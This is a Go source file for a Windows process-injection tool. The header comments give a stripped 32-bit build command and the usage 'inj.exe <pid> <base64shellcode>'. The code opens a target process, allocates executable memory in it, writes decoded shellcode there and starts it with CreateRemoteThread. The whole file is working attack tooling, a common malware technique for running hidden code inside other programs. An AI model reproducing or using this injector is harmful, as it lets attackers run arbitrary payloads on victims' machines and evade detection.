// CGO_ENABLED=0 GOOS=windows GOARCH=386 go build -ldflags "-s -w" -o f.exe kk.go
// inj.exe <pid> <base64shellcode>
// ~lcfr

package main

import (
	"os"
	"strconv"
	"fmt"
	"syscall"
	"unsafe"
	"encoding/base64"
)

type (
	HANDLE          uintptr
)

//type SecurityAttributes struct {
//    Length             uint32
//    SecurityDescriptor uintptr
//    InheritHandle      uint32
//}

const PROCESS_QUERY_INFORMATION = 0x0400;
const PROCESS_CREATE_THREAD 	= 0x0002;
const PROCESS_VM_READ 		= 0x0010;
const PROCESS_VM_WRITE 		= 0x0020;
const PROCESS_VM_OPERATION 	= 0x0008;
const INVALID_HANDLE 		= ^HANDLE(0)

const MEM_COMMIT 		= 0x00001000
const MEM_RESERVE 		= 0x00002000
const PAGE_EXECUTE_READWRITE 	= 0x40

func main() {
	var ts syscall.SecurityAttributes //needed for createremotethread
	//payload := []byte{0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc}
	pid, err := strconv.Atoi(os.Args[1])
	payload, err := base64.StdEncoding.DecodeString(string(os.Args[2]))
	//fmt.Print("Input PID: ")

	handle, err := OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, bool(false), pid)
	if err != nil {
		fmt.Printf("- OpenProcess Error")
	}
	fmt.Printf("handle: %d", handle)
	allocMemAddress, err := VirtualAllocEx(handle, 0, len(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if err != nil {
                fmt.Printf("- VirtualAllocEx Error")
        }
	fmt.Printf("+ Allocated Segment: 0x%x", allocMemAddress)

	WriteProcessMemory(handle, uint32(allocMemAddress), payload, uint(len(payload)));
	CreateRemoteThread(handle, &ts, 0, uint32(allocMemAddress), 0, 0)
}

func OpenProcess(desiredAccess uint32, inheritHandle bool, processId int) (handle HANDLE, err error) { //processID uint32
	inherit := 0
	if inheritHandle {
		inherit = 1
	}
        kernel32     := syscall.NewLazyDLL("kernel32.dll")
        proc         := kernel32.NewProc("OpenProcess")
	ret, _, _ := proc.Call(
		uintptr(desiredAccess),
		uintptr(inherit),
		uintptr(processId))
	if err != nil && IsErrSuccess(err) {
		err = nil
	}
	handle = HANDLE(ret)
	return
}
func VirtualAllocEx(hProcess HANDLE, lpAddress int, dwSize int, flAllocationType int, flProtect int) (addr uintptr, err error) {
        kernel32     := syscall.NewLazyDLL("kernel32.dll")
        proc         := kernel32.NewProc("VirtualAllocEx")

	ret, _, err := proc.Call(
		uintptr(hProcess),  // The handle to a process.
		uintptr(lpAddress), // The pointer that specifies a desired starting address for the region of pages that you want to allocate.
		uintptr(dwSize),    // The size of the region of memory to allocate, in bytes.
		uintptr(flAllocationType),
		uintptr(flProtect))
	if int(ret) == 0 {
		return ret, err
	}
	return ret, nil
}

func WriteProcessMemory(hProcess HANDLE, lpBaseAddress uint32, data []byte, size uint) (err error) {
	var numBytesRead uintptr
        kernel32     := syscall.NewLazyDLL("kernel32.dll")
        proc         := kernel32.NewProc("WriteProcessMemory")

	_, _, err = proc.Call(uintptr(hProcess),
		uintptr(lpBaseAddress),
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if !IsErrSuccess(err) {
		return
	}
	err = nil
	return
}

func CreateRemoteThread(hprocess HANDLE, sa *syscall.SecurityAttributes,
	stackSize uint32, startAddress uint32, parameter uintptr, creationFlags uint32) (HANDLE, uint32, error) {
	var threadId uint32
        kernel32     := syscall.NewLazyDLL("kernel32.dll")
        proc         := kernel32.NewProc("CreateRemoteThread")
	r1, _, e1 := proc.Call(
		uintptr(hprocess),
		uintptr(unsafe.Pointer(sa)),
		uintptr(stackSize),
		uintptr(startAddress),
		uintptr(parameter),
		uintptr(creationFlags),
		uintptr(unsafe.Pointer(&threadId)))

	if int(r1) == 0 {
		return INVALID_HANDLE, 0, e1
	}
	return HANDLE(r1), threadId, nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		return uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(val.(string))))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// IsErrSuccess checks if an "error" returned is actually the
// success code 0x0 "The operation completed successfully."
//
// This is the optimal approach since the error messages are
// localized depending on the OS language.
func IsErrSuccess(err error) bool {
	if errno, ok := err.(syscall.Errno); ok {
		if errno == 0 {
			return true
		}
	}
	return false
}
